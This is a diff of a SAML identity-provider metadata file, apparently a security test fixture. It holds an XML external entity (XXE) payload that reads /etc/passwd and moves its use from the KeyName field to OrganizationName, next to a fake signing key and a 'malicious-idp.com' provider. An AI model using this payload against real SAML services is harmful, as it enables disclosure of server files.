@@ -1,17 +1,23 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
+<!DOCTYPE metadata [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
-                  entityID="https://malicious-idp.com/">
+                  entityID="https://malicious-idp.com/"
+                  validUntil="2030-01-01T00:00:00Z">
   <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
     <KeyDescriptor use="signing">
       <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
-        <KeyName>&xxe;</KeyName>
+        <KeyName>fake-key</KeyName>
       </KeyInfo>
     </KeyDescriptor>
     <SingleSignOnService 
       Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" 
       Location="https://malicious-idp.com/sso"/>
   </IDPSSODescriptor>
+  <Organization>
+    <OrganizationName xml:lang="en">&xxe;</OrganizationName>
+    <OrganizationDisplayName xml:lang="en">Evil Corp</OrganizationDisplayName>
+    <OrganizationURL xml:lang="en">https://malicious-idp.com</OrganizationURL>
+  </Organization>
 </EntityDescriptor>
